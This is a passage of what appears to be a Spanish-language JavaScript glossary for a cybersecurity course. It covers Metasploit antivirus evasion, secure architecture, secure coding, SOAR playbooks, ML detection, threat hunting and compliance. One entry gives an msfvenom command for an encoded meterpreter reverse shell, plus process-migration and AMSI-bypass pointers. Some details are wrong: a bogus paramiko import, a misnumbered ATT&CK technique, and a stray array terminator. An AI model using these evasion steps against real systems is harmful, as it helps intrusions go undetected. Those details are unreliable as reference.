    examples: ["Escalada: getsystem fail → exploit MS16-032 UAC bypass → SYSTEM", "Pivoting: enum red desde host comprometido → encuentra DC → ataque Kerberos"],
    related: ["Privilege escalation", "Lateral movement", "Persistence"],
  },
  {
    id: 563,
    module: 53,
    term: "Evasión y ofuscación en Metasploit",
    short: "Técnicas para evitar detección de antivirus/EDR mientras se usa Metasploit.",
    detail: "**Problema**: antivirus detecta meterpreter. ¿Cómo evitar?\n\n**Capas de defensa AV:**\n1. **Signature matching** — Hash de malware conocido\n2. **Heurístico** — Comportamiento sospechoso (crear proceso, inyectar en otro)\n3. **Sandboxing** — Ejecuta en VM aislada, observa comportamiento\n4. **YARA rules** — Patrón de bytes o strings\n\n**Evasión técnicas:**\n\n**1. Encoders (obfuscación de payload)**\n```\nmsfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -e x86/shikata_ga_nai -i 5 -o payload.exe\n# -e: encoder (shikata_ga_nai = polimórfico, cambia cada ejecución)\n# -i: iterations (5 capas de codificación)\n```\nResultado: cada payload tiene hash diferente (evita signature detection).\n\n**2. Process injection**\n```\nmeterpreter > run post/windows/manage/smart_migrate\n# Inyecta meterpreter en otro proceso (explorer.exe, svchost.exe)\n# Si AV monitorea meterpreter.exe, deja de verlo\n```\n\n**3. AV evasion modules**\n```\nuse evasion/windows/applocker_evasion_exe\nuse evasion/windows/windows_defender_exclusion\n```\n\n**4. Stageless vs staged**\n- **Staged** — En dos fases (stager pequeño → descarga meterpreter completo)\n- **Stageless** — Un solo executable (más grande, no requiere descarga)\n- Algunos AV detectan descarga de segundo stage → stageless evita\n\n**5. Obfuscación de strings en código**\n```ruby\n# En exploit code:\ncommand = (\"powershell\".chars.each_slice(2).map {|s| s.join.hex.chr}.join rescue \"powershell\")\n```\nObfusca \"powershell\" para evitar YARA patterns.\n\n**Actualización post-2023:** Windows Defender (AMSI) inspecciona scripts en memoria. Bypass: amsi.Fail() hooking, AMSI.DLL injection.",
    examples: ["Encoded payload con shikata_ga_nai 7 iteraciones: detecta AV inicial, ejecuta OK", "Stageless payload: 12MB executable, sigue AV signature → necesita encoder + injection"],
    related: ["AV evasion", "Obfuscation", "Detection bypass"],
  },

  // ── M54 · Security Architecture & Design ────────────────────────────────
  {
    id: 570,
    module: 54,
    term: "Diseño de arquitectura segura",
    short: "Principios de Zero Trust, segmentación de red, defensa en profundidad aplicada al diseño.",
    detail: "**Arquitectura segura** = diseñar sistemas considerando **seguridad desde el inicio**, no como parcheando después.\n\n**Principios clave:**\n\n**1. Zero Trust**\n- \"Never trust, always verify\"\n- No existe \"dentro/fuera de la red\"\n- Cada request se autentica y autoriza, incluso internas\n- Microsegmentación: cada servicio solo puede acceder a lo que necesita\n\n**2. Defensa en Profundidad (Defense in Depth)**\nCapas: Perímetro → Red → Host → App → Datos\nSi una capa falla, otras siguen protegiendo.\n\n**3. Principio de Menor Privilegio (PoLP)**\n- Usuario/servicio tiene SOLO los permisos que necesita\n- No \"admin para todos\" ni permisos genéricos\n- Review periódico de permisos (audit)\n\n**4. Separación de Funciones**\n- Desarrollo ≠ Testing ≠ Producción (ambientes separados)\n- DBA ≠ Auditor ≠ Desarrollador (roles distintos)\n- Nadie tiene acceso a todo\n\n**Arquitectura moderna:**\n```\n                  Internet\n                     ↓\n              [WAF + DDoS]\n                     ↓\n              [Load Balancer]\n                     ↓\n        [API Gateway] → [Autenticación/AuthZ]\n                     ↓\n        ┌────────────┼────────────┐\n        ↓            ↓            ↓\n     [Service A] [Service B] [Service C]\n     (isolated)   (isolated)  (isolated)\n        ↓            ↓            ↓\n     [DB-A]      [DB-B]       [DB-C]\n   (encrypto)   (encrypto)   (encrypto)\n        ↓            ↓            ↓\n    [SIEM] ←────────┴────────────┘ [Audit logs]\n```\n\nCada servicio: autenticado, autorizado, monitoreado, aislado. Si 1 es comprometido, no afecta las otras.",
    examples: ["Netflix microservicios con malla de servicio (Istio): cada call autenticada", "GitHub: zero trust para internos, PAM para acceso admin"],
    related: ["Zero Trust", "Network segmentation", "Privilege management"],
  },
  {
    id: 571,
    module: 54,
    term: "Segmentación de red y VLANs",
    short: "Aislamiento de sistemas mediante segmentación de red para limitar movimiento lateral.",
    detail: "**Objetivo**: si un host es comprometido, que no pueda atacar todo.\n\n**Técnicas:**\n\n**VLANs (Virtual LANs)**\n- Aislamiento lógico en Switch L2\n- VLAN 10 (Desarrollo) ≠ VLAN 20 (Producción)\n- Tráfico entre VLANs solo via Router/Firewall (punto de control)\n\n**Microsegmentación (Zero Trust Network Access)**\n- Por debajo de VLAN: segmentación por workload\n- Container A no puede hablar a Container B (a menos que regla lo permita)\n- Tools: Kubernetes NetworkPolicy, malla de servicio (Istio, Linkerd)\n\n**Ejemplos:**\n```\n        VLAN 10 (Dev)           VLAN 20 (Prod)         VLAN 30 (Guest)\n        ┌──────────┐            ┌──────────┐           ┌──────────┐\n        │ Dev PC 1 │            │ Prod DB  │           │ Guest PC │\n        │ Dev PC 2 │            │ Prod API │           └──────────┘\n        └────┬─────┘            └────┬─────┘                ↑\n             └────────────┬──────────┘                       |\n                          ↓                                   |\n                  [Firewall/Router]                          |\n                     Rules:                              (No access)\n          VLAN10 → VLAN20: blocked                          |\n          VLAN20 → VLAN10: SSH only (20:22 → 10:22)        |\n          VLAN30 → any: blocked except internet\n```\n\n**ACLs y Network Policies**\n```\n# Regla típica en firewall:\nallow tcp from VLAN20 to VLAN10 port 22 (SSH)\nblock tcp from VLAN10 to VLAN20           (prevención de pivoting)\nallow tcp from any to VLAN30 port 80,443  (Guest web only)\n```\n\n**Kubernetes microsegmentation:**\n```yaml\napiVersion: networking.k8s.io/v1\nkind: NetworkPolicy\nmetadata:\n  name: api-server-policy\nspec:\n  podSelector:\n    matchLabels:\n      app: api-server\n  policyTypes:\n  - Ingress\n  - Egress\n  ingress:\n  - from:\n    - namespaceSelector:\n        matchLabels:\n          name: frontend\n    ports:\n    - protocol: TCP\n      port: 8080\n  egress:\n  - to:\n    - namespaceSelector:\n        matchLabels:\n          name: database\n    ports:\n    - protocol: TCP\n      port: 5432\n```",
    examples: ["Ransomware comprom ete dev server → intenta pivoting a prod → firewall bloquea", "Microservicio comprometido (K8s) → NetworkPolicy limita egress a puerto 5432 → robo DB bloqueado"],
    related: ["Network security", "Zero Trust", "Firewall"],
  },
  {
    id: 572,
    module: 54,
    term: "Encriptación en tránsito y en reposo",
    short: "TLS/SSL para datos en movimiento, AES/ChaCha20 para datos almacenados.",
    detail: "**En Tránsito (In Transit)** = dato moviéndose por la red\n→ **TLS 1.3** es estándar (1.2 mínimo aceptable, <1.1 deprecated)\n→ Cifra: http → https, ftp → sftp, smtp → smtps\n→ Certificados válidos + HSTS header (browser siempre usa HTTPS)\n\n**En Reposo (At Rest)** = dato guardado en disco/DB\n→ **AES-256-GCM** (militarado, NIST approved)\n→ **ChaCha20-Poly1305** (alternativa moderna)\n→ Claves en Key Vault (AWS KMS, Azure Key Vault, Hashicorp Vault), NO en código\n\n**Full Encryption Pipeline:**\n```\nCliente                         Servidor\n  data ──TLS──→ (cifrado)\n        (en tránsito)\n                          ← descifra con cert privado\n                    ↓\n                 AES-256 antes de guardar\n                    ↓\n                   DB (encrypted at rest)\n```\n\n**Implementación:**\n\n**Node.js + Express:**\n```javascript\nconst https = require('https');\nconst fs = require('fs');\nconst express = require('express');\n\nconst app = express();\n\nconst options = {\n  key: fs.readFileSync('/etc/letsencrypt/private/key.pem'),\n  cert: fs.readFileSync('/etc/letsencrypt/private/cert.pem')\n};\n\nhttps.createServer(options, app).listen(443);\n```\n\n**Python + DB encryption:**\n```python\nfrom cryptography.fernet import Fernet\n\ncipher = Fernet(key)\ndata = \"sensitive\"\nencrypted = cipher.encrypt(data.encode())\n\n# Guardar encrypted en DB\ndb.insert(table='users', data={'name': 'Alice', 'ssn': encrypted})\n```\n\n**Checklist:**\n- [ ] HTTPS en TODO (no mixed content)\n- [ ] TLS 1.2+ (disable SSL 3.0, TLS 1.0)\n- [ ] Strong ciphers (no RC4, DES, MD5)\n- [ ] Certificados válidos (no self-signed en prod)\n- [ ] HSTS header + preload (browser)  \n- [ ] Datos sensibles cifrados en DB\n- [ ] Claves en Key Vault, no en código",
    examples: ["SSL/TLS: https://bank.com (green lock)", "DB encryption: password hash con bcrypt + AES-256 encrypt fields como SSN"],
    related: ["Cryptography", "TLS", "Key management"],
  },
  {
    id: 573,
    module: 54,
    term: "Secure coding practices",
    short: "Input validation, output encoding, OWASP, prevención de inyecciones y XSS.",
    detail: "**Secure coding** = escribir código resistente a ataques comunes.\n\n**Principios:**\n\n**1. Input Validation (entrada confiable)**\n```python\n# ❌ Inseguro\nusername = request.args.get('username')\nquery = f\"SELECT * FROM users WHERE name = '{username}'\"\n# Ataque: username = \"' OR '1'='1\n\n# ✅ Seguro\nfrom paramiko import sql\nusername = request.args.get('username')\nif not re.match(r'^[a-zA-Z0-9_]{3,20}$', username):\n    return error(\"Invalid username\")\nquery = \"SELECT * FROM users WHERE name = %s\"\ndb.execute(query, (username,))  # Parameterized query\n```\n\n**2. Output Encoding (salida segura)**\n```html\n<!-- ❌ Inseguro -->\n<h1>{{ user_input }}</h1>  <!-- Si input = <script>alert(1)</script> → XSS -->\n\n<!-- ✅ Seguro (HTML encode) -->\n<h1>{{ user_input | escape }}</h1>  <!-- Output: &lt;script&gt; -->\n```\n\n**3. Authentication & Authorization**\n```python\n# ❌ Inseguro\n@app.route('/admin')\ndef admin():\n    return render('admin.html')\n\n# ✅ Seguro\nfrom flask_login import login_required, current_user\n\n@app.route('/admin')\n@login_required\n@require_role('admin')\ndef admin():\n    return render('admin.html')\n```\n\n**4. Error Handling**\n```python\n# ❌ Inseguro (expone detalles internos)\ntry:\n    data = db.query(...)\nexcept Exception as e:\n    return f\"Error: {str(e)}\", 500  # DB connection string, table names leaked\n\n# ✅ Seguro\ntry:\n    data = db.query(...)\nexcept Exception as e:\n    logger.error(f\"Database error: {e}\")\n    return \"An error occurred. Please try again.\", 500\n```\n\n**OWASP Top 10 Prevention:**\n| Fallo | Prevención |\n|---|---|\n| SQLi | Prepared statements, ORM |\n| XSS | Output encoding, CSP header |\n| CSRF | Token validation, SameSite cookie |\n| Authentication | MFA, rate limiting |\n| Broken encryption | TLS 1.2+, AES-256 |\n| Access control | Role-based, PoLP |\n| Deserialization | Avoid untrusted input, validate serialized data |\n| XXE | Disable DTD/entities en XML parser |\n| Broken logging | Encrypt logs, audit trail, alert on anomalies |",
    examples: ["Parameterized query previene SQLi", "CSP header 'default-src self; script-src cdn.example.com' bloquea XSS inline"],
    related: ["OWASP Top 10", "Input validation", "Code security"],
  },
  {
    id: 574,
    module: 54,
    term: "Security review y threat modeling",
    short: "Procesos de code review, threat modeling (STRIDE), design review.",
    detail: "**Security review** = evaluación sistemática de riesgo en diseño y código.\n\n**Threat Modeling (STRIDE)**\n\nIdentifica 6 tipos de amenaza:\n\n| Amenaza | Significa | Ejemplo |\n|---|---|---|\n| **S**poofing | Falsa identidad (auth bypass) | Usar token expirado |\n| **T**ampering | Modificar datos | MITM alter payment amount |\n| **R**epudiation | Negar acción | User niega envío de email (no hay logs) |\n| **I**nformation Disclosure | Fuga de datos | DB exposed en GitHub |\n| **D**enial of Service | Indisponibilidad | Algoritmo O(n²) en loop → crash |\n| **E**levation of Privilege | Escalar privilegios | SQL injection como admin |\n\n**Proceso STRIDE:**\n1. **Crear DFD (Data Flow Diagram)**\n   ```\n   [User] → [Web App] → [DB]\n   ```\n\n2. **Listar actores, flujos, stores**\n   - Actores: User, External API, Admin\n   - Flujos: Login request, DB query, API response\n   - Stores: Database, File system\n\n3. **Aplicar STRIDE a cada elemento**\n   - User → WebApp: ¿Spoofing? (bypass auth)\n   - WebApp → DB: ¿Tampering? (SQLi modify data)\n   - DB: ¿Information Disclosure? (encryption?)\n\n4. **Prioritizar riesgos (CVSS o custom risk score)**\n   - High: Elevation of Privilege en admin panel\n   - Medium: Information Disclosure sin filtro\n   - Low: Spoofing si MFA activo\n\n5. **Mitigación**\n   - Control: MFA, Input validation, Encryption\n   - Aceptar el riesgo: documentar decisión\n   - Transferir: compra insurance\n\n**Security Code Review (manual)**\n```\nChecklist:\n- [ ] Input validation en TODOS los entry points\n- [ ] No secrets hardcodeadas (grep 'password', 'key', 'token')\n- [ ] Autenticación presente en rutas protegidas\n- [ ] Queries parametrizadas (no f-strings)\n- [ ] Encryption en datos sensibles (DB, tránsito)\n- [ ] Error messages no exponen stack trace\n- [ ] Logs para auditoría\n- [ ] Rate limiting en endpoints públicos\n- [ ] CORS correctamente configurado\n- [ ] Dependencias actualizadas (npm audit, pip check)\n```\n\n**Automated tools:**\n- **SAST** (Static Application Security Testing): SonarQube, Checkmarx, Semgrep\n- **DAST** (Dynamic Application Security Testing): OWASP ZAP, Burp Suite\n- **Dependency scan**: npm audit, Snyk, Dependabot",
    examples: ["STRIDE en e-commerce: Tampering en amount → add control (signature en cart)", "Code review: for loop O(n²) encontrado → refactor a HashMap O(1)"],
    related: ["Threat modeling", "Security review", "OWASP"],
  },

  // ── M55 · Incident Response Automation ──────────────────────────────────
  {
    id: 580,
    module: 55,
    term: "SOAR y automatización de respuesta",
    short: "Security Orchestration, Automation, and Response (SOAR) para escalar IR.",
    detail: "**SOAR** = herramienta que automatiza respuesta a incidentes. Reduce tiempo MTTR (Mean Time To Respond).\n\n**Flujo sin SOAR (lento):**\n```\nSIEM detecta anomalía\n  ↓ (humano revisa alert en 30min)\nAnalista investiga (IP, logs, usuarios)\n  ↓ (30-60min manual)\nDecide: ¿es malicioso?\n  ↓ (30min más)\nLlama a red team: \"bloquea IP\"\n  ↓ (10min)\nCompleto: 2-3 HORAS\nDaño: usuario robó 50MB en ese tiempo\n```\n\n**Flujo con SOAR (rápido):**\n```\nSIEM detecta anomalía\n  ↓ (automático, <1seg)\nSOAR playbook ejecuta:\n  1. Query VirusTotal sobre IP (2seg)\n  2. Consulta asset inventory: ¿host crítico? (1seg)\n  3. Si crítico + IP maliciosa: auto-bloquea firewall (2seg)\n  4. Notifica equipo: \"Bloqueada IP 1.2.3.4 en 5 segundos\"\nDaño: LIMITADO a 5 segundos\n```\n\n**Ejemplos SOAR reales:**\n- Splunk SOAR (antes Phantom)\n- Demisto / Cortex XSOAR (Palo Alto)\n- Rapid7 InsightConnect\n- IBM Resilient\n\n**Playbook típico (pseudo-código):**\n```yaml\nname: \"Suspicious Login Detection\"\ntrigger: \"SIEM alert - unusual login from new IP\"\n\nsteps:\n  1. Get user info from AD\n  2. Query VirusTotal on IP\n  3. Check if inside VPN range\n  4. Parallel:\n     a. Send email to user: \"¿Fuiste tú?\"\n     b. Check if during business hours\n     c. Query Geolocation DB\n  5. If VirusTotal score > 7 AND outside VPN AND after hours:\n     → Disable account\n     → Notify CISO\n     → Create ticket\n  6. Else: Log and notify SOC for manual review\n```\n\n**Ventajas:**\n- Respuesta automática en segundos (vs horas)\n- Menos falsos positivos (playbook rules filtran ruido)\n- Escalabilidad (1 herramienta handles 1M alerts/día)\n- Documentación (todos los pasos quedan registrados, audit trail)",
    examples: ["Phishing email detectado: SOAR auto-aísla mailbox, bloquea sender, notifica usuario", "Ransomware detección: SOAR encripta backup automáticamente, aísla segmento de red"],
    related: ["Automation", "IR process", "SIEM integration"],
  },
  {
    id: 581,
    module: 55,
    term: "Playbooks de respuesta automatizados",
    short: "Definición de playbooks: acciones concretas para tipos de incidente.",
    detail: "**Playbook** = guión paso-a-paso para responder a un tipo específico de incidente.\n\n**Anatomía de un playbook:**\n```\nNombre: Ransomware Response\nTrigger: SIEM alert \"FileEncryption_Detected\" OR alert \"RansomNote_Found\"\nSeveridad: CRITICAL\nOwner: IR Team Lead\n\nPART 1: CONTENCIÓN (primeras acciones)\n├─ [AUTO] Aislar host de red inmediatamente\n├─ [AUTO] Kill suspicious processes (confer lista blanca)\n├─ [AUTO] Snapshot VM (para análisis posterior)\n├─ [MANUAL] Aviso a dueño: \"Máquina comprometida, tomamos acción\"\n└─ [AUTO] Crear ticket escalado al CISO\n\nPART 2: INVESTIGACIÓN\n├─ [AUTO] Recolectar logs (last 24h) del host\n├─ [AUTO] Exportar MFT (Master File Table) para ver archivos modificados\n├─ [MANUAL] Análisis forense: ¿cuál fue entry point? (email, web, RDP)\n├─ [AUTO] Query SIEM: ¿cuántos hosts similares se conectaron a mismo C2?\n└─ [MANUAL] Identificar patient zero (primer host comprometido)\n\nPART 3: REMEDIACIÓN\n├─ [AUTO] Parchear vulnerabilidad que permitió entry\n├─ [AUTO] Resetear credenciales comprometidas\n├─ [MANUAL] Restaurar desde backup (si disponible)\n├─ [AUTO] Re-scan con antivirus + Yara rules actualizadas\n└─ [MANUAL] Verificación: host es limpio?\n\nPART 4: COMUNICACIÓN\n├─ [AUTO] Reporte a la junta directiva (template pre-hecho)\n├─ [MANUAL] Notificar abogados (¿reportar a reguladores?)\n├─ [AUTO] Post-mortem (lecciones aprendidas)\n└─ [AUTO] Update runbook con nuevos IoCs\n```\n\n**Playbooks comunes en SOC:**\n| Tipo | Triggers | Acciones Clave |\n|---|---|---|\n| **Phishing** | Múltiples reports en Outlook | Bloquear sender, mover emails a cuarentena, disable account |\n| **Credential Compromise** | Fuerza bruta + login exitoso | Reset password, revoke tokens, check lateral movement |\n| **Malware** | AV alert + behavioral detection | Aislamiento, kill process, snapshot, reporte |\n| **Data Exfiltration** | Outlier outbound traffic + large file copy | DNS sinkhole, proxy block, data loss prevention, forense |\n| **Lateral Movement** | Pass-the-hash, Kerberoasting | Kill session, reset credentials, segment red |\n| **DoS/DDoS** | Traffic spike, latency rise | Activate WAF rules, rate limiting, notify ISP |\n\n**Implementación en SOAR (pseudo-YAML):**\n```yaml\nplaybook:\n  name: Phishing_Response\n  trigger:\n    source: \"Outlook\"\n    rule: \"Multiple users report email as phishing\"\n  \n  actions:\n    - name: \"Count reports\"\n      if: count >= 5\n      then:\n        - name: \"Get sender email\"\n          source: \"outlook_api\"\n          \n        - name: \"Check reputation\"\n          parallel:\n            - service: \"virustotal\"\n              query: sender_email\n            - service: \"proofpoint\"\n              query: sender_email\n          \n        - name: \"If malicious reputation\"\n          if: vt_score > 0.8 OR proofpoint_threat_level > 7\n          then:\n            - action: \"outlook_api.block_sender\"\n            - action: \"outlook_api.move_to_quarantine\"\n            - action: \"ad_api.disable_account\"\n            - action: \"notify_user\"\n            - action: \"create_ticket\"\n              severity: \"high\"\n              template: \"phishing_incident\"\n```",
    examples: ["Playbook Phishing: 50 usuarios reportan email → SOAR auto-cuarentena en 10seg", "Playbook Ransomware: archivo .exe encripta 1000 archivos → SOAR aísla host + notifica CISO"],
    related: ["Incident response", "Automation", "SOAR platforms"],
  },
  {
    id: 582,
    module: 55,
    term: "Integración SIEM-SOAR-EDR",
    short: "Pipeline de detección-respuesta: SIEM detecta, SOAR orquesta, EDR ejecuta.",
    detail: "**Tríada moderna de IR:**\n\n**SIEM** (Security Information & Event Management)\n- Centraliza logs de TODO (firewalls, servidores, apps)\n- Correlaciona eventos → detecta patrones\n- Crea alerts basadas en reglas\n→ Envía alert a SOAR\n\n**SOAR** (Security Orchestration, Automation, Response)\n- Recibe alert del SIEM\n- Ejecuta playbook (pasos automáticos)\n- Orquesta llamadas a herramientas (EDR, firewall, AD, email)\n→ Coordina respuesta\n\n**EDR** (Endpoint Detection & Response)\n- Corre en cada máquina (agente)\n- Detecta malware, exploits, comportamiento sospechoso\n- Puede matar procesos, aislar host, tomar snapshot\n- Envía telemetría a SIEM + responde órdenes de SOAR\n\n**Flujo integrado:**\n```\n[Attacker] → [Exploit] → [Malware corre en host]\n                            ↓\n                    [EDR agente detecta]\n                    (comportamiento sospechoso)\n                            ↓\n                    [EDR envía alert a SIEM]\n                            ↓\n                    [SIEM correlaciona con otros eventos]\n                    (10 hosts con mismo IoC + network spike)\n                            ↓\n                    [SIEM crea alert severity CRITICAL]\n                            ↓\n                    [SOAR recibe alert]\n                            ↓\n                [SOAR playbook se ejecuta:]\n                  1. Query EDR: ¿qué procesos en esos 10 hosts?\n                  2. Kill procesos maliciosos via EDR\n                  3. Query firewall: ¿IP destino C2?\n                  4. Block IP en firewall\n                  5. Snapshot todos los hosts\n                  6. Notificar team + create ticket\n                  7. Realizar análisis forense\n                            ↓\n                  [EDR aísla hosts, mata proceso]\n                  [Firewall bloquea C2]\n                  [IR team investiga offline]\n```\n\n**Tecnologías específicas:**\n- **SIEM**: Splunk, ELK Stack, ArcSight, Qradar, Azure Sentinel, DataDog\n- **SOAR**: Demisto/Cortex XSOAR, Splunk SOAR, Rapid7 InsightConnect, IBM Resilient\n- **EDR**: CrowdStrike Falcon, Microsoft Defender for Endpoint, SentinelOne, Sophos XDR\n\n**APIs necesarias (integración):**\n```\nSIEM → SOAR:\n  POST https://soar/api/incidents\n  { alert_id, rule_name, severity, events[], ...}\n\nSOAR → EDR:\n  POST https://edr/api/hosts/{host_id}/actions\n  { action: \"kill_process\", pid: 1234 }\n  { action: \"isolate_network\" }\n  { action: \"take_snapshot\" }\n\nSOAR → Firewall:\n  POST https://firewall/api/rules\n  { action: \"block\", ip: \"1.2.3.4\", port: 443, reason: \"C2\" }\n\nSOAR → AD (Active Directory):\n  POST https://ad/api/users/{uid}\n  { action: \"reset_password\", send_email: true }\n  { action: \"disable_account\" }\n```\n\n**MTTR Improvement (Mean Time To Respond):**\n- Manual IR: 4-6 horas (humano necesita investigar)\n- SIEM + playbook manual: 30-60 minutos\n- SIEM + SOAR + EDR automático: 5-15 minutos\n- Full automation: <1 minuto (pero requiere mucha sintonización)",
    examples: ["Malware C2 callback detectado → SOAR auto-aísla host + mata proceso + bloquea IP en 8seg", "Credential stuffing: 1000 failed logins → SOAR auto-resets password + notifica usuario"],
    related: ["SIEM", "EDR", "Detection automation"],
  },
  {
    id: 583,
    module: 55,
    term: "Machine Learning en detección",
    short: "Anomaly detection, behavioral analysis, model training para IR.",
    detail: "**ML en Security** = entrenar modelos para detectar comportamiento anómalo sin reglas hardcodeadas.\n\n**Casos de uso:**\n\n**1. Detección de anomalía en login**\n```\nDatos de entrenamiento:\n├─ IP historical de usuario\n├─ Hora del día (9-17 typical)\n├─ Ubicación geográfica (GPS)\n├─ Device fingerprint (navegador, OS)\n└─ Velocidad de login (segundos después de login anterior)\n\nModelo: Isolation Forest\n│\n├─ Usuario normal: IP home/office, 9-17, USA, Windows, 8h entre logins\n└─ Anomalía: IP China, 3am, Mac, 1min después de logout\n   → Probabilidad anomalía: 95% → ALERT\n```\n\n**2. Análisis de tráfico de red**\n```\nEntrenamiento on normal traffic:\n├─ Bytes/segundo (baseline)\n├─ Protocolos activos\n├─ DNS queries (dominios)\n└─ Conexiones outbound\n\nModelo: Autoencoder (NN compresa datos → reconstruye)\n│\n├─ Normal: error bajo (<5%)\n└─ Anomalía (data exfil): error alto (>80%)\n   → ALERT\n```\n\n**3. Detección de APT/Malware**\n```\nFeatures por proceso:\n├─ Nombre ejecutable\n├─ Path (¿en System32? ¿en temp?)\n├─ Parent process (¿explorer.exe la inició?)\n├─ Comportamiento (file access, network, registry)\n└─ Imports de DLL (legitimate vs suspicious)\n\nModelo: Random Forest\n├─ benign: explorer.exe, chrome.exe, notepad.exe\n└─ malware: xmr_miner.exe, wanna_cry.exe, emotet.exe\n   → PROBABILITY: 87% malware → KILL PROCESS\n```\n\n**Herramientas:**\n- **Open source**: scikit-learn, TensorFlow, PyTorch\n- **Cloud**: AWS SageMaker, Azure ML, Google ML\n- **Security-specific**: Darktrace (behavioral analytics), Crowdstrike ML\n\n**Desafíos:**\n⚠️ **Data imbalance** — Muestras normales >> raras (>99% normal, <1% ataque)\n⚠️ **Adversarial evasion** — Attacker modifica comportamiento para evitar ML\n⚠️ **False positives** — Usuarios legítimos con comportamiento raro\n⚠️ **Computacional** — Procesar millones eventos/día caro\n\n**Mitigación:**\n- SMOTE (generar samples raros artificialmente)\n- Ensemble models (múltiples modelos votan)\n- Humano-in-the-loop (modelo sugiere, humano verifica)\n- Reentrenamiento periódico (adaptarse a cambios)",
    examples: ["Isolat ion Forest: usuario login from 2 países en 2 horas → ML flag impossible travel", "Autoencoder: host exfil 500MB en 10min → ML détecta anomalía en patrón tráfico"],
    related: ["Anomaly detection", "ML", "Behavioral analysis"],
  },
  {
    id: 584,
    module: 55,
    term: "Threat hunting y búsqueda proactiva",
    short: "Usar IoCs, MITRE ATT&CK, datos históricos para cazar amenazas no detectadas.",
    detail: "**Threat Hunting** = búsqueda proactiva de indicadores de compromiso (IoCs) que SIEM no detectó.\n\nDiferencia:\n- **Detection (reactivo)**: ataque acontece → alert dispara → responden\n- **Hunting (proactivo)**: equipo busca APT activa en los logs históricos\n\n**Proceso:**\n```\n1. Hipótesis:\n   \"¿Hay actividad Emotet (malware) en nuestra red?\"\n   \n2. Información:\n   - MITRE ATT&CK ID: T1566.002 (Phishing: Email with Attachment)\n   - IoCs (Indicators of Compromise):\n     * Hash MD5 de Emotet sample: abc123def456\n     * Dominio C2: attacker-c2.xyz\n     * Servidor DNS malicioso: 8.8.9.9 (fake Google)\n   - Observables:\n     * Archivos .exe/.dll con entropy alto (encrypted)\n     * Conexiones a puertos 8080, 9999 (outbound)\n     * Event log 4688: CreateProcess de svchost.exe desde temp\n\n3. Búsqueda (query SIEM/EDR):\n   ```\n   query: (\n     file_hash:abc123def456 OR\n     domain:attacker-c2.xyz OR\n     dns_query:attacker-c2.xyz OR\n     outbound_port:(8080 OR 9999) AND process_name:svchost.exe AND path:*temp*\n   )\n   last_24_hours\n   ```\n\n4. Análisis:\n   - ¿Hallazgos?\n   - ¿En cuántos hosts?\n   - ¿Desde cuándo?\n   - ¿Timeline (cuándo se inició)?\n\n5. Acción:\n   - Si sí: playbook de IR, remediate\n   - Si no: documentar búsqueda (próxima vez busca otros IoCs)\n```\n\n**Fuentes de IoCs:**\n- **MISP** (Malware Information Sharing Platform)\n- **VirusTotal** (hashes, dominios)\n- **Shodan** (hosts expuestos)\n- **CISA alerts** (gobierno USA)\n- **Bloque C2 (C&C lists)** en comunidades de seguridad\n- **GreyNoise** (IP malignas confirmadas)\n\n**MITRE ATT&CK Framework** (táctica-técnica mapping)\n```\nTáctica: Delivery\n  ├─ T1566.001: Phishing - Email\n  ├─ T1566.002: Phishing - Email Attachment\n  └─ T1591: Phishing - Email with Link\n\nTáctica: Execution\n  ├─ T1059: Command and Scripting Interpreter\n  │  └─ T1059.001: PowerShell\n  └─ T1204: User Execution\n\nTáctica: Persistence\n  ├─ T1547.001: Registry Run Keys\n  └─ T1547.014: Scheduled Task\n\nTáctica: C2\n  ├─ T1071: Aplication Layer Protocol\n  │  └─ T1071.001: HTTP/HTTPS\n  └─ T1008: Fallback Channels\n```\n\n**Herramientas hunting:**\n- **Splunk** (query language SPL)\n- **ELK** (Elasticsearch + Kibana)\n- **Sigma** (generic SIEM rule format, portable)\n- **YARA** (pattern matching malware)\n- **Velociraptor** (EDR forense remote)",
    examples: ["Hunt: APT1 IoCs → encontrar 5 hosts con outbound conn a C2 → confirmar Emotet", "Hunt: PowerShell child proces de Excel → buscar 1000 eventos históricos → encontrar 3 compromises"],
    related: ["Proactive defense", "IoCs", "MITRE ATT&CK"],
  },
];

  // ── M56 · Compliance & Audit ────────────────────────────────────────────
  {
    id: 590,
    module: 56,
    term: "Regulaciones: GDPR, HIPAA, PCI-DSS",
    short: "Marcos legales de protección de datos y privacidad que vinculan a organizaciones.",
    detail: "**GDPR** (General Data Protection Regulation) — Europa\n- Protege datos personales de ciudadanos EU\n- Multas: hasta €20M o 4% revenue annual (lo que sea mayor)\n- Derechos: acceso, corrección, olvido, portabilidad, consentimiento\n- Consentimiento DEBE ser explícito, no implícito\n- DPA (Data Protection Authority) en cada país\n\n**HIPAA** (Health Insurance Portability and Accountability Act) — USA\n- Protege Health Information (PHI)\n- Multas: $100-$50K por violación, hasta $1.5M/año/tipo\n- Requerimientos: autenticación, autorización, auditoría, encryption\n- Business Associate Agreements (BAA) con vendors\n\n**PCI-DSS** (Payment Card Industry Data Security Standard)\n- 12 requerimientos para quién procesa tarjetas de crédito\n- Multas: $5K-$100K por mes si no cumple\n- Escaneo de vulnerabilidades trimestral (obligatorio)\n- Penetration testing anual (obligatorio)\n- Key management (no hardcoded, rotación)\n- No guardar CVV/PIN en plaintext\n\n**Cumplimiento práctico:**\n- Auditoría externa anual\n- Certificado (SOC 2, ISO 27001)\n- Breach notification en X días (varìa por ley)\n- Privacy policy + T&C actualizado\n- DPO (Data Protection Officer) si EU\n\n**Checklist GDPR:**\n- [ ] Data Inventory (qué datos, dónde, quién accede)\n- [ ] Legal basis (¿por qué procesa?)\n- [ ] Consent management (tracking de opt-in)\n- [ ] Data retention policy (borra datos viejos)\n- [ ] Privacy impact assessment (DPIA)\n- [ ] Encryption at rest + transit\n- [ ] Vendor agreements (DPA con suppliers)\n- [ ] Incident response plan\n- [ ] User rights implementation (export/delete on demand)",
    examples: ["GDPR: User requests \"derecho al olvido\" → delete all personal data within 30 days", "PCI-DSS: Tarjeta credit stored → fine $50K + breach notification + forensics"],
    related: ["Privacy", "Compliance", "Regulatory"],
  },
  {
    id: 591,
    module: 56,
    term: "Auditoría de seguridad externa",
    short: "Evaluación independiente: SOC 2, ISO 27001, pen testing reportado.",
